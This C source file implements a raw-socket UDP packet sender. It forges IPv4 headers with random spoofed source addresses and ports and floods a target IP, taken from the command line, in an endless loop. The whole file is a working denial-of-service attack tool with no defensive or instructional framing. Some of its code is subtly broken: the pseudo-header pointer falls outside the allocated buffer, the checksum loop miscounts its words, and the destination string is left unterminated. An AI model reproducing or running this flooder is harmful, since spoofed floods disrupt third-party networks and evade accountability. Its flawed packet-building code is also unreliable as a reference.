#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/socket.h>

#define IP_LENGTH 16
#define DATA_BUFF 0xffff + 1

/*
	IP
	https://www.tenouk.com/Module43_files/image001.png
*/
typedef struct
{
	uint8_t hl: 4; // IHL
	uint8_t v: 4; // Version
	uint8_t tos; // Type of serive
	uint16_t len; // Total Length
	uint16_t id; // Identification
	uint16_t off; // Fragment Offset & Flags
	uint8_t ttl; // Time to Live
	uint8_t p; // Protocol
	uint16_t chksum; // Header Checksum
	uint32_t src; // Source Address
	uint32_t dst; // Destination Address
} __attribute__ ((packed)) ip_header_t;

/*
	UDP
	https://www.tenouk.com/Module43_files/image004.png
*/
typedef struct
{
	uint16_t src_port; // Source Port
	uint16_t dst_port; // Destination Port
	uint16_t len; // Length
	uint16_t chksum; // Checksum
} __attribute__ ((packed)) udp_header_t;

/*
	UDP pseudo
	https://www.tenouk.com/Module43_files/image005.png
*/
typedef struct
{
	uint32_t src_ip;
	uint32_t dst_ip;
	uint8_t zero;
	uint8_t protocol;
	uint16_t udp_len;
} __attribute__ ((packed)) pudp_header_t;

/*
	UDP checksum
	https://img2022.cnblogs.com/blog/496181/202205/
	496181-20220505180438802-995881508.jpg

	https://img2022.cnblogs.com/blog/496181/202205/
	496181-20220505174546181-95456467.png

	https://img2022.cnblogs.com/blog/496181/202205/
	496181-20220505181654225-83766141.png
*/
uint16_t checksum(void *data, size_t len)
{
	uint32_t *p = (uint32_t *)data;
	size_t left = len;
	uint32_t sum = 0;
	while (left > 1)
	{
		sum += *p++;
		left -= sizeof(uint16_t);
	}
	if (left == 1)
	{
		sum += *(uint8_t *)p;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return ~sum;
}

int randint(int start,int end) {
	// Include start and end
	struct timeval t;
	gettimeofday(&t,NULL);
	srand((unsigned int) t.tv_usec);

	return rand() % (end - start) + start;
}

void random_address(char ip[])
{
	/*
	get random ip
	*/
	int x, lip = 0;
    char temp[5];

    for (int i = 0; i < 4; ++i)
    {
        x = randint(1, 255);
        sprintf(temp, "%d", x);
        for (int j = 0; j < strlen(temp); ++j)
        {
            ip[lip] = temp[j];
            lip++;
        }
        if (i != 3)
        {
            ip[lip] = '.';
            lip++;
        }
        memset(temp, 0, 5);
    }

	return;
}

uint16_t random_port()
{
	/*
	get a random port
	*/
	return (uint16_t)(randint(1, 65535));
}

int sendudp(char src_ip[], char dst_ip[], uint16_t src_port, uint16_t dst_port, char msg[], size_t len)
{
	char *buf = (char *)malloc(DATA_BUFF * sizeof(char));
	if (buf == NULL)
	{
		return -1;
	}
    // string IP -> bin IP
    uint32_t src_ip_v = 0;
    uint32_t dst_ip_v = 0;
    if (inet_pton(AF_INET, src_ip, &src_ip_v) <= 0 || inet_pton(AF_INET, dst_ip, &dst_ip_v) <= 0)
    {
    	printf("address error\n");
    	return -1;
    }

    int fd = -1;
    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        printf("failed to create socket\n");
        return -1;
    }
    else
    {
        /*
        https://www.cnblogs.com/YBhello/articles/5497354.html
        */
        int on = 1;
        if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1)
        {
            close(fd);
            fd = -1;
        	printf("Can't change IP part\n");
            return -1;
        }
    }

    ip_header_t *ip_header = (ip_header_t *)buf; // IP Header
    udp_header_t *udp_header = (udp_header_t *)(ip_header + 1); // UDP Header
    char *data = (char *)(udp_header + 1); // UDP Data
    pudp_header_t *pseudo_udp_header = (pudp_header_t *)(udp_header - sizeof(pudp_header_t)); // Fake UDP Header

    size_t udp_len = sizeof(*udp_header) + len;
    uint16_t total_len = sizeof(*ip_header) + sizeof(*udp_header) + len;

    // fill pseudo_udp_header, 
    pseudo_udp_header -> src_ip = src_ip_v;
    pseudo_udp_header -> dst_ip = dst_ip_v;
    pseudo_udp_header -> zero = 0;
    pseudo_udp_header -> protocol = IPPROTO_UDP; // 17
    pseudo_udp_header -> udp_len = htons(udp_len);

    udp_header -> src_port = htons(src_port);
    udp_header -> dst_port = htons(dst_port);
    udp_header -> len = htons(sizeof(*udp_header) + len);
    udp_header -> chksum = 0;

    strncpy(data, msg, len);

    // udp header + payload (checksum = 0 now)
    size_t udp_check_len = sizeof(*pseudo_udp_header) + sizeof(*udp_header) + len;
    if (len % 2 == 1)
    {
    	udp_check_len += 1;
    	data[len] = 0;
    }

    /*
	UDP checksum
    */
	udp_header -> chksum = checksum(pseudo_udp_header, udp_check_len);

	ip_header -> hl = sizeof(*ip_header) / sizeof (uint32_t);
	ip_header -> v = 4;
	ip_header -> tos = 0;
	ip_header -> len = htons(total_len);
	ip_header -> id = htons(0); // auto
	ip_header -> off = htons(0);
	ip_header -> ttl = 255;
	ip_header -> p = IPPROTO_UDP;
	ip_header -> src = src_ip_v;
	ip_header -> dst = dst_ip_v;
	ip_header -> chksum = 0;

	/*
	IP checksum
    */
	// ip_header -> chksum = checksum(ip_header, sizeof(*ip_header));

    /********************
	send
    */

    struct sockaddr_in dst_addr;
	memset(&dst_addr, 0, sizeof(dst_addr));
	dst_addr.sin_family = AF_INET;
	dst_addr.sin_addr.s_addr = dst_ip_v;
	dst_addr.sin_port = htons(dst_port);
	if (sendto(fd, buf, total_len, 0, (struct sockaddr *)&dst_addr, sizeof(dst_addr)) != total_len)
	{
		free(buf);
		close(fd);
		printf("send error\n");
		return -1;
	}
	free(buf);
	close(fd);

	return 0;
}

int main(int argc, char *argv[])
{
    char src_ip[IP_LENGTH];
    char dst_ip[IP_LENGTH];
    strncpy(dst_ip, argv[1], strlen(argv[1]));
    int src_port;
    int dst_port = 0;

    for (;;)
    {
        random_address(src_ip);
        src_port = random_port();
        printf("%-16s:%-5d -", src_ip, src_port);
        if (sendudp(src_ip, dst_ip, src_port, dst_port, "5201314", 7) == -1)
        {
        	printf("X\n");
        }
        else
        {
        	printf("OK\n");
        }
        memset(src_ip, 0, IP_LENGTH);
    }
}
